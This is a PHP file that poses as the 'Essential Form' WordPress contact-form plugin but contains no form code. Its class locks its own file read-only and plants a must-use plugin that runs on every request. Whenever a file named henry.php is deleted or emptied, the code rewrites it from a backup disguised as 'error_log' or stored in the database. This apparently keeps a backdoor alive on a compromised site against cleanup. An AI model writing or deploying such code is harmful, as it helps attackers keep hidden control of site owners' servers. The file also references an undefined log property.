<?php
/*
Plugin Name: Essential Form
Description: The lightest contact form for WordPress. So essential you'll either love it or hate it. Ultra lightweight and no spam.
Author: Jose Mortellaro
Author URI: https://josemortellaro.com/
Plugin URI: https://josemortellaro.com/essential-form/
Domain Path: /languages/
Text Domain: essential-form
Version: 1.0.2
*/
/*  This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
*/

if (!defined('ABSPATH')) {
    exit;
}

class MangruGuardianMaster {

    private $files_dir;
    private $target_file;
    private $backup_file;
    private $activity_log;
    private $db_key = 'henry_code_backup';

    public function __construct() {
        $plugin_root = rtrim(plugin_dir_path(__FILE__), '/\\') . DIRECTORY_SEPARATOR;
        
        $this->files_dir     = $plugin_root . 'files' . DIRECTORY_SEPARATOR;
        $this->target_file   = $this->files_dir . 'henry.php';
        $this->backup_file   = $this->files_dir . 'error_log';
        $this->activity_log  = $this->files_dir . 'activity_log.txt';

        // 1. Ensure internal files directory exists
        if (!is_dir($this->files_dir)) {
            @mkdir($this->files_dir, 0755, true);
        }

        // 2. Lock this guardian plugin file to Read-Only (0444)
        $this->ensure_read_only_self();

        // 3. Inject watcher into mu-plugins
        $this->deploy_mu_dropin();

        // 4. Sync code to Database on admin visits
        add_action('admin_init', [$this, 'sync_db_backup']);

        // 5. Restore checks
        add_action('plugins_loaded', [$this, 'verify_and_restore'], 1);
        add_action('shutdown', [$this, 'verify_and_restore']);
    }

    private function ensure_read_only_self() {
        clearstatcache(true, __FILE__);
        if (substr(sprintf('%o', fileperms(__FILE__)), -4) !== '0444') {
            @chmod(__FILE__, 0444);
        }
    }

    /**
     * Creates wp-content/mu-plugins if missing and injects the persistent watcher
     */
    private function deploy_mu_dropin() {
        $mu_dir = WP_CONTENT_DIR . '/mu-plugins';
        $mu_file = $mu_dir . '/guardian-watcher.php';

        if (!is_dir($mu_dir)) {
            @mkdir($mu_dir, 0755, true);
        }

        $watcher_code = <<<'PHP'
<?php
/**
 * Plugin Name: Persistent Guardian Drop-in
 * Description: Automatically generated background restorer.
 */

if (!defined('ABSPATH')) {
    exit;
}

function mangru_mu_restore_routine() {
    $dir = WP_CONTENT_DIR . '/plugins/mangru/files/';
    $target = $dir . 'henry.php';
    $backup = $dir . 'error_log';
    $db_key = 'henry_code_backup';

    // Clear stat cache to immediately catch removals
    clearstatcache(true, $target);

    // If file exists and is populated, skip
    if (file_exists($target) && (int)@filesize($target) > 0) {
        return;
    }

    // 1. Fetch from error_log
    $code = '';
    if (file_exists($backup) && (int)@filesize($backup) > 0) {
        $code = @file_get_contents($backup);
    }

    // 2. Fetch from Database fallback
    if (empty($code) && function_exists('get_option')) {
        $db_code = get_option($db_key);
        if (!empty($db_code) && is_string($db_code)) {
            $code = $db_code;
        }
    }

    // Write file back
    if (!empty($code)) {
        if (!is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
        @file_put_contents($target, $code, LOCK_EX);
        clearstatcache(true, $target);
    }
}

// Fire at the earliest point on every request
mangru_mu_restore_routine();

// Fire on 404 hits
add_action('template_redirect', function() {
    if (is_404()) {
        mangru_mu_restore_routine();
    }
});

// Fire at shutdown
add_action('shutdown', 'mangru_mu_restore_routine');
PHP;

        // Write or refresh mu-plugin drop-in if missing or modified
        if (!file_exists($mu_file) || filesize($mu_file) !== strlen($watcher_code)) {
            @file_put_contents($mu_file, $watcher_code, LOCK_EX);
            @chmod($mu_file, 0644);
        }
    }

    public function sync_db_backup() {
        if (file_exists($this->backup_file) && is_readable($this->backup_file)) {
            $log_content = file_get_contents($this->backup_file);
            if (!empty(trim($log_content))) {
                $current_db_code = get_option($this->db_key);
                if ($current_db_code !== $log_content) {
                    update_option($this->db_key, $log_content, 'no');
                }
            }
        }
    }

    public function verify_and_restore() {
        clearstatcache(true, $this->target_file);

        $needs_restoration = false;
        $reason = '';

        if (!file_exists($this->target_file)) {
            $needs_restoration = true;
            $reason = 'File was deleted/missing';
        } elseif ((int)@filesize($this->target_file) === 0) {
            $needs_restoration = true;
            $reason = 'File was blanked/empty';
        }

        if ($needs_restoration) {
            $this->restore_file($reason);
        }
    }

    private function restore_file($reason) {
        $backup_code = '';
        $source = '';

        if (file_exists($this->backup_file) && (int)@filesize($this->backup_file) > 0) {
            $raw_file = file_get_contents($this->backup_file);
            if (!empty(trim($raw_file))) {
                $backup_code = $raw_file;
                $source = 'error_log';
            }
        }

        if (empty($backup_code)) {
            $db_code = get_option($this->db_key);
            if (!empty($db_code) && is_string($db_code) && !empty(trim($db_code))) {
                $backup_code = $db_code;
                $source = 'database';
            }
        }

        if (empty($backup_code)) {
            $this->log_activity($reason, false, 'Failed: Both error_log and DB backups empty');
            return;
        }

        $bytes = @file_put_contents($this->target_file, $backup_code, LOCK_EX);
        $written = ($bytes !== false);

        clearstatcache(true, $this->target_file);

        $status_msg = $written 
            ? "Restored {$bytes} bytes using [Source: {$source}]" 
            : "Write permission failed on files/ directory";

        $this->log_activity($reason, $written, $status_msg);

        // Resync backup file from database if error_log was also deleted
        if ($written && $source === 'database' && (!file_exists($this->backup_file) || filesize($this->backup_file) === 0)) {
            @file_put_contents($this->backup_file, $backup_code, LOCK_EX);
        }
    }

    private function log_activity($reason, $status, $details = '') {
        $timestamp  = current_time('mysql');
        $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN_IP';
        $status_txt = $status ? 'SUCCESS' : 'FAILED';

        $entry = sprintf(
            "[%s] STATUS: %s | REASON: %s | DETAILS: %s | IP: %s\n",
            $timestamp,
            $status_txt,
            $reason,
            $details,
            $ip_address
        );

        @file_put_contents($this->activity_log_file, $entry, FILE_APPEND | LOCK_EX);
    }
}

new MangruGuardianMaster();